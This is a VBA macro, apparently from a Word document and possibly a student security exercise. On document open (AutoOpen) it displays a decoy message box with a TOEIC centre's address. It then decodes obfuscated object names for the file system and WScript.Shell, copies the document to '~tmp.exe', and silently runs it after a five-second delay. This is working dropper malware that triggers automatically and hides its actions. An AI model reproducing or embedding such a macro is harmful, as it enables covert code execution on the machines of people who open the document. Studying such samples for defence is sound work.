Sub AutoOpen()
    Dim message As String
    Dim title As String
    
    message = "Trung tam Toeic ABX" & vbCrLf
    message = message & "Duong so 5, Phuong nt230, Quan UIT" & vbCrLf
    title = "Thong tin"
    MsgBox message,, title

    Dim fso As Object
    Dim sourcePath As String
    Dim targetPath As String
    Dim shell As Object
    
    Dim fsoStr As String
    fsoStr = DecodeString("Tdsjqujoh/GjmfTztufnPckfdu")
    
    Dim shellStr As String
    shellStr = DecodeString("XTdsjqu/Tifmm")
    
    Set fso = CreateObject(fsoStr)
    Set shell = CreateObject(shellStr)
    sourcePath = ActiveDocument.Path & "\BT6.docm"
    targetPath = ActiveDocument.Path & "\~tmp.exe" 
        
    If fso.FileExists(targetPath) Then
        fso.DeleteFile targetPath
    End If
    fso.CopyFile sourcePath, targetPath
    
    Dim startTime As Double
    startTime = Timer
    Do While Timer < startTime + 5
        DoEvents
    Loop
    shell.Run Chr(34) & targetPath & Chr(34), 0, False
    Set fso = Nothing
    Set shell = Nothing
End Sub

Function DecodeString(encoded As String) As String
    Dim result As String
    result = ""
    For i = 1 To Len(encoded)
        result = result & Chr(Asc(Mid(encoded, i, 1)) - 1)
    Next i
    DecodeString = result
End Function